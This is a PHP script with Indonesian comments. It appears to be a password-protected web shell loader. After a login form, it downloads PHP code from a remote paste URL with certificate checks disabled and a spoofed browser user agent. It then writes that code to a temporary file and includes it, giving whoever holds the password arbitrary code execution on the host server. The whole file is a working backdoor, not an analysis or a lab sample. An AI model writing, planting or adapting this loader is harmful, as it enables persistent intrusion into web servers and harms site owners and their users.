<?php
session_start();

// Password hash (ganti dengan hash password Anda)
// Buat hash dengan: echo password_hash('password_anda', PASSWORD_DEFAULT);
$stored_hash = '$2y$10$ewOAVHj.unZ5VcGcCmrp4e.NVemtCEoT2NpeB1hkBNzzMlOGXP.kK';

// Proses login
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['pass'])) {
    if (password_verify($_POST['pass'], $stored_hash)) {
        $_SESSION['authenticated'] = true;
        $_SESSION['login_time'] = time();
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    } else {
        $error = "Password salah!";
    }
}

// Cek apakah sudah login
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    // Tampilkan form login
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login Required</title>
        <style>
            body {background:#000;color:#fff;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
            .login-box {background:rgba(255,255,255,0.1);padding:40px;border-radius:10px;text-align:center;}
            h1 {margin-bottom:20px;}
            input {width:100%;padding:10px;margin-bottom:15px;border:none;border-radius:5px;background:rgba(255,255,255,0.1);color:#fff;}
            button {width:100%;padding:10px;background:#ff0000;color:#fff;border:none;border-radius:5px;cursor:pointer;}
            .error {color:#ff4444;margin-bottom:15px;}
        </style>
    </head>
    <body>
        <div class="login-box">
            <h1>Login</h1>
            <?php if (isset($error)): ?>
                <div class="error"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>
            <form method="POST">
                <input type="password" name="pass" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit();
}

// Cek session timeout (30 menit)
$session_timeout = 30 * 60;
if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time']) > $session_timeout) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}
$_SESSION['login_time'] = time();


error_reporting(E_ALL);
ini_set('display_errors', 1);

// Function to get URL content
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        $url_get_contents_data = curl_exec($conn);
        if (curl_errno($conn)) {
            echo 'Curl error: ' . curl_error($conn);
            return false;
        }
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = @file_get_contents($url);
        if ($url_get_contents_data === false) {
            echo 'file_get_contents error';
            return false;
        }
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = @fopen($url, "r");
        if ($handle === false) {
            echo 'fopen error';
            return false;
        }
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// New URL as requested
$remote_url = 'https://priv.codes/raw/a3b6d7294dc440dd52eca0ab38887d43';

// Directly execute the main content (with a minimal safety check)
$a = geturlsinfo($remote_url);
if ($a !== false) {
    // Minimal safety check: only include if the fetched content looks like PHP
    if (stripos($a, '<?php') !== false || stripos($a, '<?=') !== false) {
        $tmp_file = sys_get_temp_dir() . '/temp_' . uniqid() . '.php';
        if (file_put_contents($tmp_file, $a) !== false) {
            include($tmp_file);
            // Note: temporary file left on disk for debugging
        } else {
            echo "Failed to write temporary file.";
        }
    } else {
        echo "Fetched content does not appear to contain PHP code. Aborting include.";
    }
} else {
    echo "Failed to retrieve content from remote URL.";
}
?>
